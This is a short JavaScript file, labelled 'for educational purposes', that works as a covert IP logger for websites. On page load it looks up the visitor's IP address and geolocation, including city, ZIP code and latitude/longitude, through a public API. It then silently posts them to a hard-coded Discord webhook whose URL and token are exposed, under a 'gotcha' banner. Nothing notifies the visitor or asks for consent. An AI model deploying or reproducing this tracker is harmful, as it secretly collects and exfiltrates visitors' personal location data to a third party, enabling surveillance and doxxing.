/*
*     Programmed by Z3NTL3
*   For Educational Purposes
*
*   Get the IP of the web visitor. Even if your website is just static HTML!
*
*   IP INFO will be sent to the configured WEBHOOK!
*
*/


const webhook = "https://discord.com/api/webhooks/1245422265844240505/5yrsvvBLpc5gQ6quAubWZgT-XCLzM1C3dnBzHnYB3-3haolLEqAV7Is_e9ywYf5hRO6G"

async function IP_Info(){
    /**
     *  Description: On init , fetches IP information of user
     *  @return {fetch.Body.json()} Resp Body
     */
    let response = await fetch("https://freeipapi.com/api/json", {
      method: 'GET',
      headers: {
        "cache-control" : "no-cache",
        "content-type": "application/json"
      }
    })
    return response.json()
  }
  IP_Info().then((value)=> {
    let requiredInfo = [
      "ipAddress","countryName", "cityName", "zipCode", "regionName", "latitude", "longitude",
    ]
    let noData = false

    for(var i = 0; i < requiredInfo.length; i++){
      if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
        noData = true
        break
      } 
    }
    if(noData){
      return null
    }
    return value
  }).then( async (value) => {
    if(value !== null){
       await fetch(webhook, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content:"``Vetements - IP :0``",
          embeds: [{
              title: "heart eyes",
              type:"rich",
              color: "12223968",
              description: "```IP information of the recent website visitor.```",
              fields: [{
                name: "IP", value: `${value.ipAddress}`, inline: false
              },
              {
                name: "Country", value: `${value.countryName}`, inline: false
              },
              {
                name: "City", value: `${value.cityName}`, inline: false
              },
              {
                name: "ZIP", value: `${value.zipCode}`, inline: false
              },
              {
                name: "Region", value: `${value.regionName}`, inline: false
              },
              {
                name: "Latitude", value: `${value.latitude}`, inline: false
              },
              {
                name: "Longitude", value: `${value.longitude}`, inline: false
              },
              ],
              footer: {
                text: "reworked by vetements",
                icon_url: "https://avatars.githubusercontent.com/u/48758770?s=400&u=d0a4b500baea4e122b127eb91b4a80af3464f9f5&v=4"
              },
              author: {
                name: "glo",
                url: "https://code.pix4.dev"
              },
              thumbnail: {
                url: "https://media.tenor.com/h2AVqgVw4ZoAAAAC/gotcha-michael-madsen.gif"
              }
          }]
        })
      }).then((value)=>{
        console.log(value.statusText)
      }).catch((err)=>{
        console.log(err)
      })
    }
  }).catch((err)=> {
    console.log(err)
    console.log('Request not send')
  })
